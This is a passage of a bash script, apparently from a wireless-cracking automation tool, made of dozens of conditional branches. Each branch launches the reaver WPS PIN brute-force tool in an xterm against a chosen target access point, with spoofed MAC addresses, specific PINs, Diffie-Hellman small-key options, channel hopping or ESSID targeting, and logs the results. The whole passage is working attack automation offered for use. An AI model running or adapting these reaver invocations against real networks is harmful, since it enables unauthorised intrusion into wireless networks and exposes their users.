xterm -g 80x10-1+1 -T "Reaver3-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1h-dh" -e "reaver -i $MON -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2h-dh" -e "reaver -i $MON -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver3h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3h-dh" -e "reaver -i $MON -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &
		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4h-dh" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-dh" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-dh" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-dh" -e "reaver -i $MON -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-dh" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-dh" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End  Reaver Program Booleans no -e essid End###

###Start Reaver Program Booleans Start with -e essid###

########
if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver3e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

